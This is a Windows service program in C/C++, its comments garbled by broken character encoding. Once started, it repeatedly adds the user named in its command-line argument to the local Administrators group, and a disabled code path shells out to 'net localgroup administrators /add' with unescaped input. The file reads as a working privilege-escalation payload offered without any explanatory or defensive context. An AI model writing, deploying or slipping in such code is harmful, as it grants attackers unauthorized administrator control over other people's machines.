#include <Windows.h>
#include <LM.h>
#include <tchar.h>


////////////////////////////////////////////////////////////////////////////////
// ȫ�ֱ���

static SERVICE_STATUS_HANDLE g_svc_status_handle = NULL;
static SERVICE_STATUS g_status = { 0 };
static HANDLE g_stop_event = NULL;
static TCHAR g_service_name[32] = _T("");

static HINSTANCE g_inst = NULL;


////////////////////////////////////////////////////////////////////////////////


static DWORD init_service(){ return 0; }		// ���ڳ�ʼ������
static void uninit_service(){}				// ������ֹ����


/////////////////////////////////////////////////////////////////////////////////
// ���÷���ǰ״̬

static void set_service_status()
{
	if (g_svc_status_handle != NULL)
		SetServiceStatus(g_svc_status_handle, &g_status);
}


/////////////////////////////////////////////////////////////////////////////////
// ����û�������Ա��

static void add_user_to_administrators(LPWSTR user)
{
#if 1
#pragma comment( lib, "Netapi32.lib" )

	LOCALGROUP_MEMBERS_INFO_3 mi;
	mi.lgrmi3_domainandname = user;
	NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)(&mi), 1);

#else

	WCHAR cmd[128] = L"net localgroup administrators /add ";
	wcscat( cmd, __wargv[1] );
	_wsystem( cmd );

#endif
}

/////////////////////////////////////////////////////////////////////////////////
// ִ��

static DWORD service_run()
{
	DWORD error = init_service();

	g_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_status.dwControlsAccepted = 0;
	g_status.dwCheckPoint = 0;
	g_status.dwWaitHint = 1000;
	g_status.dwWin32ExitCode = ERROR_SUCCESS;
	g_status.dwServiceSpecificExitCode = 0;
	g_status.dwCurrentState = SERVICE_START_PENDING;
	set_service_status();

	g_status.dwCheckPoint = 0;
	g_status.dwWaitHint = 0;
	g_status.dwCurrentState = SERVICE_RUNNING;
	g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	g_status.dwControlsAccepted |= SERVICE_ACCEPT_SHUTDOWN;
	set_service_status();

	for (int i = 0; i < 5 * 60 * 2; ++i)
	{
		if (i % (30 * 2) == 0)
			add_user_to_administrators(__wargv[1]);
		Sleep(500);
	}

	uninit_service();
	g_status.dwCheckPoint = 0;
	g_status.dwWaitHint = 0;
	g_status.dwCurrentState = SERVICE_STOPPED;
	set_service_status();

	return error;
}


////////////////////////////////////////////////////////////////////////////////
// ���շ����������

static DWORD WINAPI control_service(DWORD dwControl, DWORD, LPVOID, LPVOID)
{
	DWORD res = ERROR_SUCCESS;

	switch (dwControl)
	{
	case SERVICE_CONTROL_SHUTDOWN:
	case SERVICE_CONTROL_STOP:
		g_status.dwCheckPoint = 0;
		g_status.dwCurrentState = SERVICE_STOP_PENDING;
		g_status.dwWaitHint = 2000;
		g_status.dwControlsAccepted = 0;
		set_service_status();
		SetEvent(g_stop_event);
		break;

	case SERVICE_CONTROL_INTERROGATE:
		set_service_status();
		break;

	default:
		set_service_status();
		res = ERROR_CALL_NOT_IMPLEMENTED;
		break;
	}

	return res;
}


////////////////////////////////////////////////////////////////////////////////
// service��������

static VOID WINAPI service_main(DWORD, LPTSTR* argv) throw()
{
	_tcsncpy(g_service_name, argv[0], _countof(g_service_name));
	g_service_name[_countof(g_service_name) - 1] = 0;

	// ע�����
	g_svc_status_handle = RegisterServiceCtrlHandlerEx(
		g_service_name,
		control_service,
		NULL
		);

	if (g_svc_status_handle == NULL)
		g_status.dwWin32ExitCode = GetLastError();
	else
		g_status.dwWin32ExitCode = service_run();
}


////////////////////////////////////////////////////////////////////////////////


int APIENTRY _tWinMain(HINSTANCE hInst, HINSTANCE, LPTSTR, int)
{
	g_inst = hInst;

	// �ȳ����Է�����ʽ����
	static SERVICE_TABLE_ENTRY st[] =
	{
		// SERVICE_WIN32_OWN_PROCESS, ��������ν
		{ _T(""), service_main },
		{ NULL, NULL }
	};

	if (!::StartServiceCtrlDispatcher(st))
	{
		// �������������ʧ��, ��Ѵ�����밴Win32ExitCode����
		g_status.dwWin32ExitCode = GetLastError();
		// ���Ƿ���, ����ͨӦ�ó�������
		if (g_status.dwWin32ExitCode == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT)
			g_status.dwWin32ExitCode = service_run();
	}

	return g_status.dwWin32ExitCode;
}


////////////////////////////////////////////////////////////////////////////////